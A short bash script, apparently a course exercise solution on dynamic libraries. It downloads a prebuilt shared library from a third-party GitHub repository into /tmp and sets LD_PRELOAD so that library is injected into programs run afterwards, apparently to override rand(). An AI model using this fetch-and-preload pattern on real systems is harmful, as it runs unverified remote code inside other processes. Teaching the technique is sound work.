#!/bin/bash
curl -L -o "/tmp/librand.so" https://raw.githubusercontent.com/TobiLight/alx-low_level_programming/main/0x18-dynamic_libraries/librand.so
export LD_PRELOAD='/tmp/librand.so'
